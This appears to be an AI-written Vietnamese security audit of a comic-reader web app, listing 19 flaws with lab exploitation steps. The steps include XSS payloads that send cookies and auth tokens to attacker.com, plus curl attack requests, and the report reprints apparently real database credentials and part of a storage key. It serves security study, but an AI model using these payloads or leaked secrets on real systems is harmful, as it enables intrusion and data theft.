# 🛡️ Báo Cáo Rà Soát Bảo Mật - ComicReaderSite

Dưới đây là kết quả rà soát **chi tiết từng dòng code** của toàn bộ project `Comic` (Backend Java/Servlet) và `ComicReaderSite` (Frontend Next.js/React).

---

## Bảng Tổng Hợp Vulnerabilities

| # | Tên Lỗ Hổng | OWASP Category | Mức Độ | File | Dòng Code | Có Thể Khai Thác Lab? |
|---|---|---|---|---|---|---|
| 1 | Hardcoded Azure Blob Storage Key | A07 - Security Misconfiguration | 🔴 Critical | [AzureBlobUploader.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/service/AzureBlobUploader.java#L12) | L12 | ✅ |
| 2 | Hardcoded MySQL Credentials | A07 - Security Misconfiguration | 🔴 Critical | [SeriesServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/SeriesServlet.java#L26-L28) | L26-28 | ✅ |
| 3 | Default Admin Credentials in Frontend | A07 - Security Misconfiguration | 🔴 Critical | [AuthContext.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/contexts/AuthContext.tsx#L7-L8) | L7-8 | ✅ |
| 4 | Stored XSS via EPUB `allowScriptedContent` | A03 - Injection (XSS) | 🔴 Critical | [reader/page.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/app/(site)/reader/page.tsx#L144) | L144 | ✅ |
| 5 | IDOR - Bookmark via `devUser` param | A01 - Broken Access Control | 🟠 High | [BookmarkServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BookmarkServlet.java#L32-L47) | L32-47 | ✅ |
| 6 | IDOR - Reading History (No Auth on GET) | A01 - Broken Access Control | 🟠 High | [ReadingHistoryServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#L30-L44) | L30-44 | ✅ |
| 7 | Missing Authentication - Post Creation | A01 - Broken Access Control | 🟠 High | [PostApiServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/PostApiServlet.java#L32-L55) | L32-55 | ✅ |
| 8 | Missing Authentication - Comment Creation | A01 - Broken Access Control | 🟠 High | [CommentApiServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/CommentApiServlet.java#L39-L59) | L39-59 | ✅ |
| 9 | Author ID Spoofing (Client-controlled) | A01 - Broken Access Control | 🟠 High | [PostApiServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/PostApiServlet.java#L46) | L46 | ✅ |
| 10 | Broken Access Control - Dashboard Stats | A01 - Broken Access Control | 🟡 Medium | [DashboardServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/DashboardServlet.java#L74-L81) | L74-81 | ✅ |
| 11 | Insecure Token Storage (localStorage) | A04 - Insecure Design | 🟡 Medium | [AuthContext.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/contexts/AuthContext.tsx#L90-L91) | L90-91 | ✅ |
| 12 | Plaintext Password Fallback | A02 - Cryptographic Failures | 🟡 Medium | [PasswordUtil.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/util/PasswordUtil.java#L21) | L21 | ✅ |
| 13 | User Enumeration via Forgot Password | A07 - Security Misconfiguration | 🟡 Medium | [ForgotPasswordServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ForgotPasswordServlet.java#L31-L37) | L31-37 | ✅ |
| 14 | Sensitive Data Logging (Credentials) | A09 - Security Logging Failures | 🟡 Medium | [AuthServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/AuthServlet.java#L72-L73) | L72-73 | ✅ |
| 15 | Sensitive Data Logging (Passwords/Tokens) | A09 - Security Logging Failures | 🟡 Medium | [ResetPasswordServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ResetPasswordServlet.java#L28-L29) | L28-29 | ✅ |
| 16 | Verbose Error / Stack Trace Leakage | A04 - Insecure Design | 🟡 Medium | [BookmarkServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BookmarkServlet.java#L39-L44) | L39-44 | ✅ |
| 17 | CORS Wildcard (`Access-Control-Allow-Origin: *`) | A05 - Security Misconfiguration | 🟢 Low | [BaseServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BaseServlet.java#L24) | L24 | ✅ |
| 18 | Gson `disableHtmlEscaping()` | A03 - Injection | 🟢 Low | [BaseServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BaseServlet.java#L20) | L20 | ✅ |
| 19 | IDOR - Delete History (No Owner Check) | A01 - Broken Access Control | 🟠 High | [ReadingHistoryServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#L85-L111) | L85-111 | ✅ |

---

## Chi Tiết Từng Vulnerability

---

### 1. 🔴 Hardcoded Azure Blob Storage Connection String
- **File:** [AzureBlobUploader.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/service/AzureBlobUploader.java#L12)
- **Dòng 12:** `CONNECTION_STRING = "DefaultEndpointsProtocol=https;AccountName=typoo06;AccountKey=cuo0NsaO7kucN8..."`
- **Phân tích:** Toàn bộ Azure Storage Account Key được hardcode trực tiếp vào source code và đã commit lên Git. Attacker có access vào repo (hoặc decompile `.class`) sẽ có **toàn quyền** truy cập Azure Blob Storage: đọc, ghi, xóa mọi file trên container `temp`.
- **Khai thác Lab:** Dùng Azure Storage Explorer hoặc `az storage blob list --connection-string "..."` để browse và tải toàn bộ file epub đã upload.

---

### 2. 🔴 Hardcoded MySQL Database Credentials
- **File:** [SeriesServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/SeriesServlet.java#L26-L28)
- **Dòng 26-28:**
```java
dbUrl  = "jdbc:mysql://websql1.mysql.database.azure.com:3306/comic?useSSL=true...";
dbUser = "ppk123@websql1";
dbPass = "Mysql@1234";
```
- **Phân tích:** Hardcode toàn bộ connection string, username, password của Azure MySQL. Bất kỳ ai có access vào source code đều có thể kết nối trực tiếp tới database production.
- **Khai thác Lab:** Dùng MySQL Workbench hoặc `mysql -h websql1.mysql.database.azure.com -u ppk123@websql1 -p` để kết nối trực tiếp, dump toàn bộ database.

---

### 3. 🔴 Default Admin Credentials Baked Into Frontend
- **File:** [AuthContext.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/contexts/AuthContext.tsx#L7-L8)
- **Dòng 7-8:**
```typescript
const DEFAULT_USERNAME = process.env.NEXT_PUBLIC_DEFAULT_USERNAME || 'admin';
const DEFAULT_PASSWORD = process.env.NEXT_PUBLIC_DEFAULT_PASSWORD || 'admin123';
```
- **Phân tích:** Nếu env var chưa set (rất thường xuyên ở local dev), frontend sẽ tự động login bằng `admin` / `admin123`. Credential ngầm này bị **bundle vào JavaScript client-side** (vì `NEXT_PUBLIC_` prefix) nên ai cũng đọc được.
- **Khai thác Lab:** Mở DevTools → Sources → tìm chuỗi `admin123` trong JS bundle. Hoặc trực tiếp đăng nhập `admin` / `admin123`.

---

### 4. 🔴 Stored XSS via EPUB File Upload (`allowScriptedContent: true`)
- **File:** [reader/page.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/app/(site)/reader/page.tsx#L144)
- **Dòng 144:** `allowScriptedContent: true`
- **Phân tích:** Epub.js khi render sách, sẽ cho phép bất kỳ `<script>` nào trong file HTML bên trong ePub chạy trực tiếp trong ngữ cảnh trình duyệt người đọc. Attacker upload một ePub chứa payload JS → bất kỳ ai mở đọc đều bị XSS.
- **Khai thác Lab:**
  1. Giải nén một file `.epub` có sẵn
  2. Chèn `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>` vào file HTML bên trong
  3. Nén lại thành `.epub`, upload lên hệ thống
  4. Mở đọc bằng tài khoản admin → JS payload thực thi

---

### 5. 🟠 IDOR - Bookmark Bypass qua `devUser` Parameter
- **File:** [BookmarkServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BookmarkServlet.java#L32-L47)
- **Dòng 32-47:**
```java
String devUser = req.getParameter("devUser");
if (devUser != null && !devUser.isBlank()) {
    List<Bookmark> bookmarks = bookmarkDAO.findByUserId(devUser);
    writeJson(resp, bookmarks);
    return;  // ← bypass toàn bộ auth check bên dưới
}
```
- **Phân tích:** Tham số `devUser` cho phép bỏ qua hoàn toàn việc xác thực. Bất kỳ ai gọi `GET /api/bookmarks?devUser=admin-001` sẽ nhận được bookmark của admin mà không cần token.
- **Khai thác Lab:** `curl "http://host/api/bookmarks?devUser=admin-001"` — không cần header Authorization.

---

### 6. 🟠 IDOR - Reading History (Không Yêu Cầu Authentication)
- **File:** [ReadingHistoryServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#L30-L44)
- **Phân tích:** [doGet()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/SeriesServlet.java#60-124) nhận `userId` từ query param và trả về lịch sử đọc mà **không kiểm tra token**. So sánh với [doPost()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ForgotPasswordServlet.java#16-39) và [doDelete()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#84-113) cùng file — đều yêu cầu [getAuthenticatedUser(req)](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#114-121).
- **Khai thác Lab:** `curl "http://host/api/reading-history?userId=1"` — lặp qua từng userId để thu thập lịch sử của mọi người.

---

### 7. 🟠 Missing Authentication - Tạo Post Không Cần Đăng Nhập
- **File:** [PostApiServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/PostApiServlet.java#L32-L55)
- **Phân tích:** [doPost()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ForgotPasswordServlet.java#16-39) không có bất kỳ kiểm tra auth nào. Bất kỳ ai cũng có thể tạo bài post mới bằng cách gửi JSON payload tới `/api/posts`.
- **Khai thác Lab:**
```bash
curl -X POST http://host/api/posts \
  -H "Content-Type: application/json" \
  -d '{"title":"Hacked","content":"XSS content","authorId":"admin-001"}'
```

---

### 8. 🟠 Missing Authentication - Tạo Comment Không Cần Đăng Nhập
- **File:** [CommentApiServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/CommentApiServlet.java#L39-L59)
- **Phân tích:** Tương tự Post, [doPost()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ForgotPasswordServlet.java#16-39) cho phép tạo comment mà không xác thực. `authorId` do client tự gửi.
- **Khai thác Lab:**
```bash
curl -X POST http://host/api/comments \
  -H "Content-Type: application/json" \
  -d '{"postId":1,"content":"Spam comment","authorId":"admin-001"}'
```

---

### 9. 🟠 Author ID Spoofing (Client-Controlled Identity)
- **File:** [PostApiServlet.java L46](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/PostApiServlet.java#L46) + [CommentApiServlet.java L55](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/CommentApiServlet.java#L55)
- **Phân tích:** Server tin tưởng hoàn toàn trường `authorId` từ JSON body do client gửi lên. Attacker có thể mạo danh bất kỳ user nào (kể cả admin) khi tạo Post hoặc Comment.
- **Khai thác Lab:** Gửi `"authorId": "admin-001"` trong body request → bài viết hiển thị như do admin đăng.

---

### 10. 🟡 Broken Access Control - Dashboard Stats (Role Check Sai)
- **File:** [DashboardServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/DashboardServlet.java#L74-L81)
- **Dòng 79-80:** `return user != null;` — chỉ kiểm tra user đã login, **không kiểm tra role admin**.
- **Phân tích:** Bất kỳ user thường nào đã đăng nhập đều truy cập được thống kê hệ thống (tổng user, tổng manga, activity log,...).
- **Khai thác Lab:** Đăng nhập bằng tài khoản user bình thường → gọi `GET /api/dashboard/stats` và `GET /api/dashboard/activity`.

---

### 11. 🟡 Insecure Token Storage (localStorage)
- **File:** [AuthContext.tsx](file:///d:/phuc/Code%20Project/ComicReaderSite/ComicReaderSite/src/contexts/AuthContext.tsx#L90-L91)
- **Phân tích:** Token xác thực được lưu trong `localStorage`, nơi mà bất kỳ JavaScript nào chạy trên cùng origin đều đọc được. Kết hợp với lỗi XSS số 4 → attacker dễ dàng `localStorage.getItem('authToken')` để chiếm phiên đăng nhập.
- **Khai thác Lab:** Kết hợp với XSS ePub (vuln #4): `fetch('http://attacker.com/?t='+localStorage.getItem('authToken'))`

---

### 12. 🟡 Plaintext Password Verification Fallback
- **File:** [PasswordUtil.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/util/PasswordUtil.java#L21)
- **Dòng 21:** `return hashed.equals(plain);`
- **Phân tích:** Khi password không phải bcrypt hash (ví dụ: các user seed mặc định ở [UserDAO.java L341-344](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/dao/UserDAO.java#L341-L344)), hàm [verify()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/util/PasswordUtil.java#15-27) so sánh trực tiếp plaintext. Điều này có nghĩa password seeded ban đầu (admin, moderator, editor, reader) được lưu dưới dạng SHA-256 hex **nhưng verify lại so plaintext**, tạo ra logics không nhất quán và có thể bypass.
- **Khai thác Lab:** Nếu đọc được database (vuln #2), có thể dùng trực tiếp giá trị hash làm password để đăng nhập (vì `equals(plain)` sẽ match).

---

### 13. 🟡 User Enumeration via Forgot Password
- **File:** [ForgotPasswordServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ForgotPasswordServlet.java#L31-L37)
- **Phân tích:** Response khác nhau tuỳ email có tồn tại hay không: `"Email đặt lại mật khẩu đã được gửi."` vs `"Email không tồn tại trong hệ thống."`. Attacker có thể brute-force danh sách email để biết email nào đã đăng ký.
- **Khai thác Lab:** Script gửi POST `/api/auth/forgot-password` với danh sách email → lọc response để xác định email hợp lệ.

---

### 14. 🟡 Sensitive Data Logging - Credentials in Console
- **File:** [AuthServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/AuthServlet.java#L72-L73)
- **Dòng 72-73:**
```java
System.out.println("getEmail after update: " + loginRequest.getEmail());
System.out.println("getPassword after update: " + loginRequest.getPassword());
```
- **Phân tích:** Mỗi lần user đăng nhập, email và **password plaintext** được in ra console/log file của Tomcat. Ai có access log server sẽ thu thập được mọi credential.
- **Khai thác Lab:** Đọc file `catalina.out` hoặc log container Docker.

---

### 15. 🟡 Sensitive Data Logging - Reset Token & New Password
- **File:** [ResetPasswordServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ResetPasswordServlet.java#L28-L29)
- **Dòng 28-29:**
```java
System.out.println("token after update: " + token);
System.out.println("newPassword after update: " + newPassword);
```
- **Phân tích:** Reset token và mật khẩu mới bị log ra console.

---

### 16. 🟡 Verbose Error Messages - Stack Trace Leakage
- **File:** [BookmarkServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BookmarkServlet.java#L39-L44) + [BaseServlet.java L46](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BaseServlet.java#L46)
- **Phân tích:** Khi có exception, server trả về chi tiết class name, method name, và stack trace trong JSON response cho client. Ví dụ: `"Error fetching bookmarks: java.lang.NullPointerException at reader.site.Comic.dao.BookmarkDAO.findByUserId(BookmarkDAO.java:42)"`. Thông tin này giúp attacker hiểu kiến trúc nội bộ.
- **Khai thác Lab:** Gửi request gây lỗi (ví dụ: `GET /api/bookmarks?devUser=|||`) và đọc stack trace trả về.

---

### 17. 🟢 CORS Wildcard `Access-Control-Allow-Origin: *`
- **File:** [BaseServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BaseServlet.java#L24) + [EpubServlet.java L53](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/EpubServlet.java#L53)
- **Phân tích:** Mọi origin đều được phép gọi API. Kết hợp với XSS, attacker có thể tạo trang web giả mạo để gọi API backend từ domain bất kỳ.
- **Khai thác Lab:** Tạo một file HTML trên `http://evil.com` có JS gọi `fetch('http://target/api/...')` — vì CORS cho phép `*`, request sẽ thành công.

---

### 18. 🟢 Gson `disableHtmlEscaping()`
- **File:** [BaseServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/BaseServlet.java#L20)
- **Phân tích:** Khi serialize JSON response, Gson sẽ **không** escape các ký tự HTML như `<`, `>`, `"`. Nếu dữ liệu từ user (post content, comment, username) chứa HTML/JS, nó sẽ được trả về nguyên vẹn trong JSON. Dù React tự escape khi render `{variable}`, đây là một lớp phòng thủ bị thiếu.

---

### 19. 🟠 IDOR - Delete Reading History (No Owner Check)
- **File:** [ReadingHistoryServlet.java](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#L85-L111)
- **Phân tích:** [doDelete()](file:///d:/phuc/Code%20Project/ComicReaderSite/Comic/src/main/java/reader/site/Comic/servlet/ReadingHistoryServlet.java#84-113) yêu cầu auth nhưng **không kiểm tra** xem bản ghi history có thuộc về user đang request hay không. User A có thể xóa history của User B bằng cách đoán/brute `historyId`.
- **Khai thác Lab:** Đăng nhập user bình thường → `DELETE /api/reading-history/123` (ID thuộc user khác).

---

## Tóm Tắt Theo Loại Attack Có Thể Thực Hiện Trong Lab

| Attack Scenario | Vuln Sử Dụng | Độ Khó |
|---|---|---|
| 🎯 **Chiếm toàn quyền Azure Blob Storage** | #1 | Dễ |
| 🎯 **Truy cập trực tiếp Database Production** | #2 | Dễ |
| 🎯 **Đăng nhập Admin không cần tìm password** | #3 | Rất dễ |
| 🎯 **Stored XSS → Chiếm Session Admin** | #4 + #11 | Trung bình |
| 🎯 **Đọc bookmark / lịch sử đọc người khác** | #5, #6 | Dễ |
| 🎯 **Spam / giả mạo bài viết dưới tên Admin** | #7, #8, #9 | Dễ |
| 🎯 **User thường xem Dashboard Admin** | #10 | Dễ |
| 🎯 **Enumerate email đã đăng ký** | #13 | Dễ |
| 🎯 **Xóa lịch sử đọc người khác** | #19 | Dễ |
| 🎯 **Thu thập credentials từ log** | #14, #15 | Cần access log |

> ⚠️ **Lưu ý:** Không có dòng code nào bị sửa đổi. Tất cả lỗ hổng giữ nguyên hiện trạng để bạn thực hành khai thác trong Lab.
